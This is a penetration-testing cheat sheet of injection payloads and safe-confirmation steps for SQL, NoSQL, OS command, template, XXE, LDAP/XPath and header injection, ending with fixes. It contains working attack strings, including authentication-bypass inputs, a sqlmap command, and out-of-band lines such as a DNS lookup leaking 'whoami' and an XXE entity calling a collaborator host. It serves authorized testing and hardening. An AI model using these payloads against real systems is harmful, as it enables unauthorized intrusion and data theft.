# Injection Detection & Safe-Confirmation Recipes

> Authorized/non-prod. Confirm with benign payloads (errors, timing, math, OOB). Never destroy
> or exfiltrate real data. `interactsh`/Burp Collaborator = your OOB canary for blind cases.

## SQL injection
- **Error-based:** inject `'` `"` `)` `';` — DB error or changed response = candidate.
- **Boolean blind:** `?id=1' AND '1'='1` (true) vs `?id=1' AND '1'='2` (false) → differential.
- **Time blind:** `?id=1'; SELECT pg_sleep(5)-- ` / `' OR SLEEP(5)-- ` / `WAITFOR DELAY '0:0:5'`.
- **UNION:** find column count (`ORDER BY n`), then `UNION SELECT` benign markers.
- **Confirm scope, don't loot:** `--dbs`/`--tables` to prove access; stop before `--dump` of real data.
```bash
sqlmap -u "URL/item?id=1" --batch --level=2 --risk=1 --technique=BEU --dbs
```

## NoSQL injection (Mongo etc.)
- Operator injection in JSON: `{"user":"admin","pass":{"$ne":null}}` → auth bypass.
- In query string: `user[$ne]=&pass[$ne]=`.
- JS context: `$where` payloads, `'||'1'=='1`.

## OS command injection
- Separators: `; | & && || \n` + a benign command: `;id`, `| whoami`, `$(id)`, `` `id` ``.
- Blind: time `;sleep 5` / `& ping -c 5 127.0.0.1`, or **OOB**: `;nslookup $(whoami).<collab>`.
- Argument injection: leading `-`/`--flag` into a tool call.

## Server-side template injection (SSTI)
- Detect: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` — if `49` renders, it's evaluated.
- Identify engine (Jinja2/Twig/Freemarker/ERB/Velocity) via probe differences, then use the
  engine-appropriate read/exec gadget — **stop at a benign proof** (e.g. read a non-secret config
  value) on your own app; don't pop a shell on shared infra.

## XXE (XML external entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "http://<collab>/xxe"> ]>
<r>&x;</r>
```
- OOB hit on your collaborator = confirmed. For file read use a benign canary file you placed.
- Try where XML is parsed: SOAP, SAML, SVG/Office uploads, `Content-Type: application/xml`.

## LDAP / XPath injection
- LDAP: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)` → filter manipulation / auth bypass.
- XPath: `' or '1'='1`, `']|//user/*|//x['` → return unintended nodes.

## CRLF / header injection
- Inject `%0d%0a` into values reflected in response headers → split headers, set cookies, or
  cache-poison. Confirm by observing an injected header in the response.

## Second-order
Store a payload (profile name, filename), then trigger the path that later uses it in a query/
command/template. The injection fires on *use*, not on input.

## Map → fix (for hardening)
Parameterized queries / prepared statements; cast & validate types (NoSQL); avoid the shell, use
exec arrays + allowlists; sandbox/avoid template eval of input; disable DTD/external entities;
escape for LDAP/XPath; strip CR/LF from header values.
